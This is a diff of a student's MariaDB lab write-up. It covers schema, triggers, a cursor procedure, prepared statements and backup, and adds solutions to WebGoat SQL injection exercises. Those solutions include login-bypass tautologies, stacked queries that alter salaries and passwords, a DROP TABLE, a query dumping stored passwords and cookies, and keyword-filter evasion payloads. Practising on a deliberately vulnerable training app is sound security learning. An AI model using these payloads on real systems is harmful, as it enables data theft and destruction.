@@ -7,8 +7,14 @@
 - [Lab 3](#lab-3)
   - [Rafał Włodarczyk](#rafał-włodarczyk)
     - [2024-12-03](#2024-12-03)
-  - [Solves](#solves)
-    - [Exercise 1](#exercise-1)
+  - [Solves (must sum to 20)](#solves-must-sum-to-20)
+    - [Exercise 1 (5)](#exercise-1-5)
+    - [Exercise 4 (2) - prepare execute](#exercise-4-2---prepare-execute)
+    - [Exercise 5 (4) - backup](#exercise-5-4---backup)
+    - [Exercise 6](#exercise-6)
+      - [Intro (2)](#intro-2)
+      - [Advanced (4)](#advanced-4)
+      - [Mitigation (4)](#mitigation-4)
 
 MariaDB Setup:
 
@@ -52,9 +58,9 @@ docker compose down && docker volume rm lista3_db_data
 docker exec -it mariadb-container mariadb -D db2024 -u root -prootpassword
 ```
 
-## Solves
+## Solves (must sum to 20)
 
-### Exercise 1
+### Exercise 1 (5)
 
 Utwórz nową bazę danych o dowolnej nazwie a w niej tabele:
 
@@ -104,19 +110,16 @@ BEGIN
 END$$
 DELIMITER ;
 
-
-
 -- Ludzie (PESEL: char(11), imie: varchar(30), nazwisko: varchar(30),
 -- data_urodzenia: date, plec: enum('K', 'M'))
 
 CREATE TABLE Ludzie (
-    PESEL char(11) PRIMARY KEY,
-    imie varchar(30),
-    nazwisko varchar(30),
-    data_urodzenia date,
-    plec enum('K', 'M')
+    PESEL CHAR(11) PRIMARY KEY,
+    imie VARCHAR(30) NOT NULL,
+    nazwisko VARCHAR(30) NOT NULL,
+    data_urodzenia DATE NOT NULL,
+    plec ENUM('K', 'M') NOT NULL
 );
-
 
 -- PESEL jest zdefiniowany jako `char(11)`. Należy dopisać funkcje sprawdzającą poprawność numeru PESEL.
 -- Trigger to validate the PESEL number
@@ -141,19 +144,20 @@ DELIMITER ;
 -- Dopilnuj, by nie można było wprowadzić także ujemnych wartości liczbowych do bazy oraz aby pensja_min < pensja_max.
 
 CREATE TABLE Zawody (
-    zawod_id int PRIMARY KEY,
-    nazwa varchar(50),
-    pensja_min float CHECK (pensja_min >= 0),
-    pensja_max float CHECK (pensja_max > pensja_min)
+    zawod_id INT PRIMARY KEY AUTO_INCREMENT,
+    nazwa VARCHAR(50),
+    pensja_min FLOAT CHECK (pensja_min >= 0),
+    pensja_max FLOAT CHECK (pensja_max > pensja_min)
 );
 
 -- Pracownicy (PESEL: char(11), zawod_id: int, pensja: float)
 
 CREATE TABLE Pracownicy (
+    id INT AUTO_INCREMENT,
     PESEL char(11),
     zawod_id int,
     pensja float CHECK (pensja >= 0),
-    PRIMARY KEY (PESEL, zawod_id),
+    PRIMARY KEY (id, PESEL), -- pracownik może mieć zatrudniony w wielu branżach
     FOREIGN KEY (PESEL) REFERENCES Ludzie(PESEL),
     FOREIGN KEY (zawod_id) REFERENCES Zawody(zawod_id)
 );
@@ -286,46 +290,258 @@ Następnie, z wykorzystaniem kursora na tabeli Ludzie, przypisz każdej pełnole
 DELIMITER $$
 CREATE OR REPLACE PROCEDURE AddEmployees()
 BEGIN
-    DECLARE done INT DEFAULT 0;
-    DECLARE pesel CHAR(11);
-    DECLARE zawod_id INT;
-    DECLARE pensja FLOAT;
-    DECLARE pensja_min FLOAT;
-    DECLARE pensja_max FLOAT;
-    DECLARE cur CURSOR FOR 
-        SELECT PESEL FROM Ludzie WHERE TIMESTAMPDIFF(YEAR, data_urodzenia, CURDATE()) >= 18 AND PESEL IS NOT NULL;
-    DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = 1;
+    -- Deklaracje zmiennych dla kursora
+    DECLARE done INT DEFAULT FALSE;
+    DECLARE t_pesel CHAR(11);
+    DECLARE t_birthdate DATE;
+    DECLARE t_gender ENUM('K', 'M');
+    DECLARE t_age INT;
+    DECLARE random_profession_id INT;
+    DECLARE min_salary FLOAT;
+    DECLARE max_salary FLOAT;
+    DECLARE rnd_salary FLOAT;
 
-    OPEN cur;
+    DECLARE ludzie_cursor CURSOR FOR
+        SELECT PESEL, data_urodzenia, plec
+        FROM Ludzie
+        WHERE DATEDIFF(CURDATE(), data_urodzenia) / 365.25 >= 18;
 
-    read_loop: LOOP
-        FETCH cur INTO pesel;
-        
+    DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;
+
+    OPEN ludzie_cursor;
+
+    ludzie_loop: LOOP
         IF done THEN
-            LEAVE read_loop;
+            LEAVE ludzie_loop;
         END IF;
 
-        -- Losowanie zawodu z tabeli Zawody
-        SELECT zawod_id, pensja_min, pensja_max INTO zawod_id, pensja_min, pensja_max
-        FROM Zawody
-        ORDER BY RAND()
-        LIMIT 1;
+        -- Pobierz dane osoby z kursora
+        FETCH ludzie_cursor INTO t_pesel, t_birthdate, t_gender;
 
-        -- Losowanie pensji w przedziale dla wylosowanego zawodu
-        SET pensja = pensja_min + (RAND() * (pensja_max - pensja_min));
+        -- Oblicz wiek osoby
+        SET t_age = FLOOR(DATEDIFF(CURDATE(), t_birthdate) / 365.25);
 
-        -- Debugging: Check if the INSERT statement is being reached
-        SELECT pesel, zawod_id, pensja; -- Check values before insert
+        -- Wybierz losowy zawód
+        REPEAT
+            SELECT zawod_id, pensja_min, pensja_max
+            INTO random_profession_id, min_salary, max_salary
+            FROM Zawody
+            ORDER BY RAND()
+            LIMIT 1;
 
-        -- Dodanie do tabeli Pracownicy
-        IF pesel IS NOT NULL THEN
-            INSERT INTO Pracownicy (PESEL, zawod_id, pensja) VALUES (pesel, zawod_id, pensja);
+            -- Jeśli zawód to lekarz, sprawdź dodatkowe warunki wiekowe
+            IF (random_profession_id = (SELECT zawod_id FROM Zawody WHERE nazwa = 'Lekarz')) THEN
+                IF (t_gender = 'M' AND t_age > 65) OR (t_gender = 'K' AND t_age > 60) THEN
+                    SET random_profession_id = NULL;
+                END IF;
+            END IF;
+        UNTIL random_profession_id IS NOT NULL END REPEAT;
+
+        -- Wylosuj pensję w widełkach dla danego zawodu
+        SET rnd_salary = min_salary + RAND() * (max_salary - min_salary);
+
+        -- Wstaw dane do tabeli `Pracownicy`
+        IF NOT EXISTS (
+            SELECT 1 FROM Pracownicy 
+            WHERE PESEL = t_pesel AND zawod_id = random_profession_id
+        ) THEN
+            INSERT INTO Pracownicy (PESEL, zawod_id, pensja)
+            VALUES (t_pesel, random_profession_id, rnd_salary);
         END IF;
+
     END LOOP;
 
-    CLOSE cur;
+    -- Zamknij kursor
+    CLOSE ludzie_cursor;
 END $$
 DELIMITER ;
 
 CALL AddEmployees();
+```
+
+### Exercise 4 (2) - prepare execute
+
+```sql
+PREPARE WomenNumberByProfession FROM 
+    "SELECT COUNT(*) AS liczba_kobiet
+     FROM Pracownicy p
+     JOIN Ludzie l ON p.PESEL = l.PESEL
+     JOIN Zawody z ON p.zawod_id = z.zawod_id
+     WHERE l.plec = 'K' AND z.nazwa = ?";
+
+SET @nazwa_zawodu = 'Lekarz';
+EXECUTE WomenNumberByProfession USING @nazwa_zawodu;
+
+DEALLOCATE PREPARE WomenNumberByProfession;
+```
+
+### Exercise 5 (4) - backup
+
+1. Wykonaj backup bazy danych db2024 do pliku `db2024.sql`.
+
+```bash
+docker exec -it mariadb-container mariadb-dump --routines --triggers -u root -prootpassword db2024 > init.sql
+```
+
+2. Usuń bazę
+
+```bash
+docker compose down && docker volume rm lista3_db_data
+``` 
+
+3. Przywróć bazę
+
+```bash
+docker compose up -d
+```
+
+Jaka jest różnica między backupem pełnym a różnicowym? 
+
+```
+Backup pełny uwzględnia zrzucenie wszystkich danych z bazy, natomiast backup róznicowy dodaje inkrementalnie zmiany od ostatniego backupu. 
+Standardowy tooling do snapshotów PVC typu kopia/restic pozwala na tworzenie kolejnych backupów różnicowych na sobie.
+```
+
+### Exercise 6
+
+[WebGoat OWASP](https://owasp.org/www-project-webgoat/)
+
+Visit and do exercises on: https://github.com/WebGoat/WebGoat/
+
+Run via:
+
+```bash
+docker run -it -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 webgoat/webgoat
+```
+
+#### Intro (2)
+
+Navigate to http://localhost:8080/WebGoat/login, register as `admin1::admin1`
+
+ex2. 
+
+```sql
+SELECT department FROM Employees WHERE first_name LIKE '%Bob%';
+```
+
+ex3.
+
+```sql
+UPDATE Employees SET department = 'Sales' WHERE first_name = 'Tobi' AND last_name = 'Barnett';
+```
+
+ex4.
+
+```sql
+ALTER TABLE employees ADD COLUMN phone VARCHAR(20);
+```
+
+ex5.
+
+```sql
+GRANT ALL ON grant_rights TO unauthorized_user;
+```
+
+ex9.
+
+```sql
+-- '
+-- or
+-- '1'='1
+SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or '1' = '1'
+```
+
+ex10.
+
+```sql
+-- login_count: 2
+-- user_id: 2 OR 1=1
+SELECT * From user_data WHERE Login_Count = 2 and userid= 2 OR 1 = 1
+```
+
+ex11.
+
+```sql
+-- Employee Name: "
+-- Authentication TAN: "' OR 1=1--
+```
+
+ex12.
+
+```sql
+-- Employee Name: "
+-- Authentication TAN: "';UPDATE employees SET salary=100000 WHERE first_name='John' AND last_name='Smith';--
+```
+
+ex13.
+
+```sql
+"'; DROP TABLE access_log;--
+```
+
+#### Advanced (4)
+
+ex3.
+
+```sql
+-- dump table
+'; SELECT userid, user_name, password, cookie, null, null, null FROM user_system_data; -- 
+-- dave password is: passW0rD
+```
+
+ex5.
+
+```sql
+-- in the registration form
+Tom'; UPDATE SQL_CHALLENGE_USERS set PASSWORD = 'pwd' WHERE USERID = 'tom'; --
+```
+
+ex6.
+
+```sql
+
+```
+
+#### Mitigation (4)
+
+ex5.
+
+```
+getConnection
+PreparedStatement statement
+prepareStatement
+?
+?
+statement.setString(1,"1");
+statement.setStirng(2,"2");
+```
+
+ex6.
+
+```java
+try {  
+     Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);  
+     PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");  
+     ps.setString(1, "Admin");  
+     ps.executeUpdate(); 
+} catch (Exception e) {  
+     System.out.println("Oops. Something went wrong!");  
+}
+```
+
+ex9
+
+```sql
+a';/**/select/**/*/**/from/**/*/**/user_system_data;--
+```
+
+ex10
+
+```sql
+a';/**/seselectlect/**/*/**/frfromom/**/user_system_data;--
+```
+ex12
+
+```
+104.130.219.202
 ```
